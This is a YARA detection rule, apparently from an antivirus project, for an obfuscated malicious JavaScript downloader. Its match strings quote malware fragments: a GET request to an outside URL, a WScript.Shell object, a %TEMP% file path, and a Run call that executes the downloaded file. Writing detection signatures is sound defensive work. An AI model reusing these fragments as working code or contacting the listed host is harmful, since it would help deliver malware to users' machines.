rule sig_20160427_7619b8df642f204ca19afd837c567abb {
  meta:
    description = "datamaliciousorder - file 20160427_7619b8df642f204ca19afd837c567abb.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4c1da11ef8802ed6fe260b72f5c4767d1ebd83744000572aa8603ede88b720fc"

  strings:
    $s1  = "YgkkfQzdul[SacogJyjyb](\"G\" + \"ET\", \"http://onlinecrockpotrecipes.com/k2tspa\", false);" fullword ascii
    $s2  = "function FbdqiSjsez() {return TzlufAcghb[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"EbWmF8y" ascii
    $s3  = "function FbdqiSjsez() {return TzlufAcghb[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"EbWmF8y" ascii
    $s4  = "function HerbiWidtc(OoehsYlmvz, VkulcHfdur){TjeclLuopr = TjeclLuopr * 1; return OoehsYlmvz - VkulcHfdur;};" fullword ascii
    $s5  = "var TzlufAcghb = function BsxjtDficq() {return DtpbjSfspn[UfumsAguex](\"WScript\"+\".Shell\");}(), XutknXfzmk = 11;" fullword ascii
    $s6  = "var DtpbjSfspn = this[\"WScript\"];" fullword ascii
    $s7  = "if (YgkkfQzdul[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function EdsqmZssno(){return MobuoBzfvg + \"\";};" fullword ascii
    $s9  = "function QrhdkWaiqd() {return ((SgtqtKtdgd == true) && (SgtqtKtdgd == FkgnbRjmak)) ? 1 : TjeclLuopr;};" fullword ascii
    $s10 = "function IfhzsIfgwe(PfhudRgdvg){TzlufAcghb[\"R\"+\"un\"](PfhudRgdvg, TjeclLuopr, TjeclLuopr);};" fullword ascii
    $s11 = "function QoprjUhzaf(){return 23;};" fullword ascii
    $s12 = "function PubwbPskfg()" fullword ascii
    $s13 = "return HerbiWidtc(MyukcQzgey, FyzjqOzeyg);" fullword ascii
    $s14 = "SgtqtKtdgd = true; " fullword ascii
    $s15 = "FkgnbRjmak = true; " fullword ascii
    $s16 = "}while (UjcjoSzmcy);" fullword ascii
    $s17 = "var CvligLdeqp = new this[\"D\"+\"ate\"]();" fullword ascii
    $s18 = "function VzxdjXaiyd(WzxvtRjren) {var UmdktDxxvl = (1, 2, 3, 4, 5, WzxvtRjren); return UmdktDxxvl;};" fullword ascii
    $s19 = "var VswkyXkilf = false;" fullword ascii
    $s20 = "var FkgnbRjmak = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}